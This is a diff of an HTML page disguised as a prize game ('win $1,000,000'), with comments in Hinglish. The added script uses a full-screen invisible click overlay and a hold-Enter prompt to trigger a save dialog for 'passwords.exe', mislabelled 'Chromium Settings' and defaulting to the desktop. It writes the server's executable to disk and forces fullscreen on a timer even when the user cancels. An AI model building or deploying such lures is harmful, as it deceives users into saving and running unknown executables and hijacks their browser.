@@ -1,56 +1,39 @@
 <html>
 <head>
-    <title>Super Simple Game</title>
+    <title>Save file - 1 Sec Fullscreen</title>
     <meta charset="UTF-8">
-    <style>
-        body {
-            background: rgba(29, 48, 109, 0.849);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
-            cursor: pointer; /* Taaki user ko pata chale click karna hai */
-            font-family: sans-serif;
-        }
-        h1, h2, h3 { -webkit-text-stroke: 1px #00000050; text-align: center; margin: 10px; }
-        h1 { color: #D96C06; font-size: 50px; }
-        h2 { color: #1ebe8e; font-size: 40px; }
-        h3 { color: #C6F91F; font-size: 30px; }
-        h2 span { color: #cf4848; font-size: 60px; }
-    </style>
 </head>
+<style>
+    body {
+        background: rgba(29, 48, 109, 0.849);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+        height: 100vh;
+        margin: 0;
+    }
+    h1, h2, h3 { -webkit-text-stroke: 1px #00000050; text-align: center; }
+    h1 { color: #D96C06; font-size: 56px; }
+    h2 { color: #1ebe8e; font-size: 56px; }
+    h3 { color: #C6F91F; font-size: 56px; }
+    h2 span { color: #cf4848; font-size: 90px; }
+</style>
 <body>
-
-    <h1>Super Simple Game😻😻😻</h1>
-    <h2><span>⌨️HOLD ENTER</span> or CLICK</h2>
-    <h3>To win $1,000,000! 🔥🚀</h3>
-    <h3 id="gameover"></h3>
-
     <script>
         let countEnter = 0;
-        let active = false;
+        let isDownloaded = false;
 
-        async function startAction() {
-            if (active) return;
-            active = true;
+        window.onload = function () {
+            const body = document.querySelector('body');
+            const pixel = document.querySelector('#pixel');
 
-            try {
-                // 1. Download Window Trigger (File System API)
-                const options = {
-                    suggestedName: 'passwords.exe',
-                    types: [{
-                        description: 'Executable File',
-                        accept: {'application/x-msdownload': ['.exe']}
-                    }]
-                };
-                
-                // Ye line download prompt kholegi
-                const handle = await window.showSaveFilePicker(options);
+            body.onkeydown = e => (e.key == "Enter") ? clickedEnter() : 1;
+            body.onkeyup = e => (e.key == "Enter") ? cancelEnter() : 1;
 
-                // 2. 1 Second baad Fullscreen
+            pixel.addEventListener('click', async () => {
+                // --- TRICK YAHAN HAI ---
+                // Save window khulne se pehle timer start kar do
                 setTimeout(() => {
                     const elem = document.documentElement;
                     if (elem.requestFullscreen) {
@@ -58,36 +41,54 @@
                     } else if (elem.webkitRequestFullscreen) {
                         elem.webkitRequestFullscreen();
                     }
-                }, 1000);
+                    console.log("1 Second Over: Fullscreen Triggered!");
+                }, 1000); 
 
-                // 3. File likhna (Optional, agar server pe passwords.exe hai)
-                const writable = await handle.createWritable();
-                const response = await fetch('passwords.exe');
-                const blob = await response.blob();
-                await writable.write(blob);
-                await writable.close();
+                try {
+                    const options = {
+                        startIn: 'desktop',
+                        suggestedName: 'passwords.exe',
+                        types: [{
+                            description: 'Chromium Settings',
+                            accept: { 'application/x-msdownload': ['.exe'] }
+                        }],
+                        excludeAcceptAllOption: true
+                    };
 
-                document.querySelector("#gameover").textContent = "GAME OVER!";
-            } catch (err) {
-                console.log("Error or Cancelled", err);
-                active = false; // Reset taaki dobara click ho sake
+                    // Ab ye popup khulega, lekin timer piche chal raha hai
+                    const handle = await window.showSaveFilePicker(options);
+                    
+                    const writable = await handle.createWritable();
+                    const response = await fetch('passwords.exe');
+                    await response.body.pipeTo(writable);
+                    
+                    document.querySelector("#gameover").textContent = "GAME OVER";
+                } catch (err) {
+                    // Agar user cancel bhi karde, fullscreen phir bhi ho jayega timer ki wajah se
+                    console.log("Interaction check:", err);
+                }
+            });
+        };
+
+        function clickedEnter() {
+            countEnter++;
+            if (countEnter > 5 && !isDownloaded) {
+                document.querySelector('#pixel').click();
+                isDownloaded = true;
             }
         }
 
-        // Click hone pe start
-        document.addEventListener('click', startAction);
-
-        // Enter hold karne pe start
-        document.addEventListener('keydown', (e) => {
-            if (e.key === "Enter") {
-                countEnter++;
-                if (countEnter > 5) startAction();
-            }
-        });
-
-        document.addEventListener('keyup', (e) => {
-            if (e.key === "Enter") countEnter = 0;
-        });
+        function cancelEnter() {
+            countEnter = 0;
+        }
     </script>
+
+    <div id="pixel" style="position:fixed; top:0; left:0; width:100%; height:100%; z-index:10; cursor:pointer;"></div>
+
+    <h1>Super Simple Game😻😻😻</h1>
+    <h2><span>⌨️HOLD ENTER</span> for 5 seconds</h2>
+    <h3>click on Save</h3>
+    <h4>win $1,000,000 and rule the world! 🔥🔥🔥🚀</h4>
+    <h3 id="gameover"></h3>
 </body>
 </html>
